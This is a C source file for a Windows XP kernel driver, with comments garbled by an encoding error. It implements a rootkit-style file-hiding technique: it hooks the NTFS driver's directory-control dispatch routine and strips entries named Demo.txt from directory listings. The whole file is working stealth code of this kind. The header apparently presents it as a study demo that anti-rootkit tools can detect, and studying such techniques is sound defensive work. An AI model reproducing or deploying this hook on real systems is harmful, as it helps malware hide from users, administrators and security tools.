//
//Description:
//  ����������������ΪDemo.txt���ļ�����XP SP3ƽ̨Ntfs�ļ�ϵͳ�ϲ���ͨ����
//ʹ�õ�ԭ��ܼ򵥣��滻Ntfs��һ��IRP�ַ����̡�ʹ������ķ�Rootkit���߾��ɼ�⡣
//  ʹ��vs2008+visualDDK+WDK7100����
//  ������ֻ����ԭ�����ʹ�ã�������������;ʹ�á�
//
//Writen By: ���� 2011/3/9
//
//Last Write Time: 2011/3/9
//
#include "stdafx.h"

//ȫ�ֱ���������ԭʼIRP��������ַ
LONG uOrgDispathFunAddr = 0;

#ifdef __cplusplus
    extern "C" NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING  RegistryPath);
#endif

NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING  RegistryPath)
{
    //������ֻ����ʵ���ļ����أ�û���漰��Ӧ�ò㽻�������Բ��ô����豸����
    DriverObject->DriverUnload = HideDemoUnload;
    //ʵ���ļ����صĹ��ܺ���
    HideDemoFile();
    return STATUS_SUCCESS;
}

void HideDemoUnload(IN PDRIVER_OBJECT DriverObject)
{
    PDRIVER_OBJECT pDrvObj = NULL;
    //xx��һ���꣬#define xx DPFLTR_IHVDRIVER_ID ,0xFFFFFFFF
    KdPrintEx((xx, "[HideDemoUnload]\n"));
    //��ȡNtfs�����������ַ
    pDrvObj = GetNtfsDrvobj();

    if (NULL == pDrvObj) {
        return ;
    }

    //�ָ�Ntfs��IRP�ַ�����
    //ʹ��ԭ�Ӳ��������Ա���hook���������
    InterlockedExchange((LONG*)&pDrvObj->MajorFunction[IRP_MJ_DIRECTORY_CONTROL], (LONG)uOrgDispathFunAddr);
}

NTSTATUS HideDemoFile()
{
    NTSTATUS status = STATUS_SUCCESS;
    PDRIVER_OBJECT pDrvObj = NULL;

    do {
        //��ȡNtfs�����������ַ
        pDrvObj = GetNtfsDrvobj();

        if (NULL == pDrvObj) {
            KdPrintEx((xx, "[HideDemoFile] GetNtfsDrvobj Failure!\n"));
            status = STATUS_UNSUCCESSFUL;
            break;
        }

        //���汻Hook������ԭʼ��ַ���Ժ���Ҫ������
        uOrgDispathFunAddr = (LONG)pDrvObj->MajorFunction[IRP_MJ_DIRECTORY_CONTROL] ;
        //Hook Ntfs�����ܺ�ΪIRP_MJ_DIRECTORY_CONTROL�ķַ�����
        InterlockedExchange((LONG*)&pDrvObj->MajorFunction[IRP_MJ_DIRECTORY_CONTROL], (LONG)NewDispatchRoutine);
    } while (false);

    return status;
}

PDRIVER_OBJECT
GetNtfsDrvobj()
{
    UNICODE_STRING  usNtfs;
    NTSTATUS        ntStatus = STATUS_SUCCESS;
    PDRIVER_OBJECT  pDrvObj = NULL;
    KdPrintEx((xx, "[GetNtfsDrvobj]\n"));
    //�������ռ���\\FileSystem\\Ntfs������Ntfs�������󣬻�ȡ���Ϳ�����
    RtlInitUnicodeString(&usNtfs, L"\\FileSystem\\Ntfs");
    //ObReferenceObjectByName��������ͨ�����Ƶõ������ַ
    //*IoDriverObjectType��nt�ں˵�����
    ntStatus = ObReferenceObjectByName(&usNtfs, OBJ_CASE_INSENSITIVE, NULL,
                                       0, *IoDriverObjectType, KernelMode, NULL, (PVOID*)&pDrvObj);

    if (!NT_SUCCESS(ntStatus)) {
        KdPrintEx((xx, "[GetNtfsDrvobj] ObReferenceObjectByName Failure! ntStatus=0x%08x\n",
                   ntStatus));
        return NULL;
    }

    //������
    ObDereferenceObject(pDrvObj);
    KdPrintEx((xx, "[GetNtfsDrvobj]Ntfs drvobj: 0x%08x\n", pDrvObj));
    return pDrvObj;
}

//
//�Զ���ķַ����̣�ͨ��������ɺ��������Ļ�����
//���ǣ�����ʹ��IoSetCompletionRoutine����
//
NTSTATUS NewDispatchRoutine(PDEVICE_OBJECT pDevObj, PIRP pIrp)
{
    NTSTATUS status = STATUS_SUCCESS;
    PIO_STACK_LOCATION  pSP = NULL;
    ULONG uCompleteRoutineAddr = 0;
    PCompletePara pPara = NULL;
    pSP = IoGetCurrentIrpStackLocation(pIrp);

    do {
        //��������IRP�ι�������IRP_MN_QUERY_DIRECTORY
        //�������FileInformationClass��FileBothDirectoryInformation
        //������Ҫ��ע��IRP��������
        if ((pSP->MinorFunction == IRP_MN_QUERY_DIRECTORY) &&
            (pSP->Parameters.QueryDirectory.FileInformationClass == FileBothDirectoryInformation)
           ) {
            //����һ��CompletePara�ṹ�����ڴ洢ԭ����ɺ��������Ϣ
            //�Ժ󽫻�ָ�����ԭ��ɺ���
            pPara = (PCompletePara)ExAllocatePoolWithTag(NonPagedPool, sizeof(CompletePara), 'wjl');

            if (NULL == pPara) {
                break;
            }

            //���汾�ṹ��ַ���Ժ�ʹ�����ͷ��ڴ�
            pPara->SelfAddr = (PVOID)pPara;
            //����ԭ������ɺ�����ַ������ΪNULL��
            pPara->CompletionRoutine = pSP->CompletionRoutine;
            //����ԭ����ɺ����Ĳ���
            pPara->Context = pSP->Context;
            //����ԭ���Ŀ��Ʊ�ǣ�ʹ�ÿ��Ʊ����������������µ�����ɺ�����
            pPara->Control = pSP->Control;
            //ʹ�����Ƕ������ɺ����滻ԭ������ɺ������������µĲ���
            InterlockedExchange((LONG*)&pSP->CompletionRoutine, (LONG)NewCompleteRoutine);
            InterlockedExchange((LONG*)&pSP->Context, (LONG)pPara);
            //�����µĿ��Ʊ�ǣ���ԭ���Ŀ��Ʊ��������һ��SL_INVOKE_ON_SUCCESS���
            //�����ȱ�֤ԭ������µ�ԭ��ɺ����϶������ã��ֱ�֤�����Զ������ɺ����ڳɹ�������±�����
            //��ԭ�е�Controlֵ����Ϊ0��
            pSP->Control |= SL_INVOKE_ON_SUCCESS;
        }
    } while (false);

    //���ؿ��ƣ�ִ��ԭ���ķַ�����
    return ((fnDispatchRoutine)uOrgDispathFunAddr)(pDevObj, pIrp);
}


//
//����������������صĻ�������ʵ������Demo.txt
//
NTSTATUS
NewCompleteRoutine(
    IN PDEVICE_OBJECT  DeviceObject,
    IN PIRP  pIrp,
    IN PVOID  Context
)
{
    PFILE_BOTH_DIR_INFORMATION pInfo;
    char *pBuf = NULL;
    ULONG NextEntryOffset = 0;
    PIO_STACK_LOCATION pSP = IoGetCurrentIrpStackLocation(pIrp);
    PCompletePara pPara = (PCompletePara)Context;
    fnIoCompletion RealIoCompletion = NULL;
    PVOID RealContext = NULL;
    ULONG uHideNodeSize = 0, uRemainInfoSize = 0;
//����Ƚ����⣬��ǰջ��Ԫָ����Ҫ�ƶ�һ����λ����������Ч�ĵ�ǰջ��Ԫ
//  pSP--;
//
//  KdPrintEx((xx,"StackCount:%d CurrentStack:%d\n",
//      pIrp->StackCount,pIrp->CurrentLocation));
    //���ظ��û��Ļ��������ݱ�����UserBuffer����
    pBuf = (char*)pIrp->UserBuffer;

    do {
        //���ò��ɹ�ֱ������
        if (pIrp->IoStatus.Information <= 0) {
            break;
        }

        uRemainInfoSize = pIrp->IoStatus.Information;

        do {
            if (NULL == pBuf) {
                break;
            }

            //����pBuf��ַ����Ӧ�ò㣬�п��ܽ��̵��û����Ѿ��л�
            //��Ϊ���õı��ϰ�ߣ���Ҫ����ProbeForRead�����
            //ʵ���ϣ��ڱ��ߵĲ��Ի����ϣ�����һֱ����ԭ���ý��̵Ļ�����û���л�
            _try {
                ProbeForRead(pBuf, 4, 4);
            }
            _except(EXCEPTION_CONTINUE_EXECUTION) {
                KdPrintEx((xx, "Probe for Read Failure!\n"));
                break;
            };
            pInfo = (PFILE_BOTH_DIR_INFORMATION)pBuf;
            KdPrintEx((xx, "Buf:%ws\n", pInfo->FileName));

            //pInfo->FileNameLength�����ֽ����
            //�ж��Ƿ�����Ҫ���ص��ļ�Demo.txt
            if (RtlEqualMemory(pInfo->FileName, L"Demo.txt", pInfo->FileNameLength)) {
                KdPrintEx((xx, "Find Demo.txt\n"));
                //��������
                uHideNodeSize = HandleBuffer(pInfo, uRemainInfoSize);

                if (0 == uHideNodeSize) {
                    KdPrintEx((xx, "HandleBuffer Failure!\n"));
                    break;
                }

                //�������س���
                pIrp->IoStatus.Information -= uHideNodeSize;
                break;
            }

            NextEntryOffset = *(ULONG*)pBuf;
            pBuf += NextEntryOffset;
            uRemainInfoSize -= NextEntryOffset;
        } while (NextEntryOffset);
    } while (false);

    //
    //ʵ���ϣ���ǰ��װ��ɺ�������ջ��Ԫ��IRPջ�ռ�ĵ�һ��Ҳ��Ψһ��һ����Ч��Ԫ��
    //�������ԭ�ȴ�����ɺ�������ô�����ɺ�����Ȼ����IRP�������ߣ�I/O����������ĳ�����������õ�
    //

    //����Control���Ʊ���ж��Ƿ����ԭ��ɺ���
    if ((NT_SUCCESS(pIrp->IoStatus.Status) &&
         pPara->Control & SL_INVOKE_ON_SUCCESS) ||
        (!NT_SUCCESS(pIrp->IoStatus.Status) &&
         pPara->Control & SL_INVOKE_ON_ERROR) ||
        (pIrp->Cancel &&
         pPara->Control & SL_INVOKE_ON_CANCEL)
       ) {
        //ԭ������ɺ����Լ������ĵ�ַ����������Context��������
        RealIoCompletion = (fnIoCompletion)pPara->CompletionRoutine;
        RealContext = pPara->Context;
        //������ǰ����ĸýṹ��ַ���ͷŵ��ýṹ
        ExFreePoolWithTag(pPara->SelfAddr, 'wjl');
        return RealIoCompletion(DeviceObject, pIrp, RealContext);
    }

    if (pIrp->PendingReturned) {
        IoMarkIrpPending(pIrp);
    }

    ExFreePoolWithTag(pPara->SelfAddr, 'wjl');
    return STATUS_SUCCESS;
}

//
//Description:
//  ������������������ļ��Ļ�����
//
ULONG HandleBuffer(PFILE_BOTH_DIR_INFORMATION Info, ULONG InfoSize)
{
    char *pBuf = (char*)Info;
    ULONG uEntrySize = Info->NextEntryOffset;
    ULONG uRet = 0;
    PVOID pTempBuf = NULL;

    //���uEntrySizeΪ0����ʾ�û�����ֻ��һ�����������
    if (0 == uEntrySize) {
        uRet = InfoSize;
        RtlZeroMemory(pBuf, InfoSize);
    } else {
        //����������кܶ������
        //������������գ��������ַǰ��
        uRet = uEntrySize;
        pTempBuf = ExAllocatePoolWithTag(NonPagedPool, InfoSize - uEntrySize, 'wjl');

        if (NULL == pTempBuf) {
            return 0;
        }

        RtlCopyMemory(pTempBuf, pBuf + uEntrySize, InfoSize - uEntrySize);
        RtlZeroMemory(pBuf, InfoSize);
        RtlCopyMemory(pBuf, pTempBuf, InfoSize - uEntrySize);
        ExFreePoolWithTag(pTempBuf, 'wjl');
    }

    return uRet;
}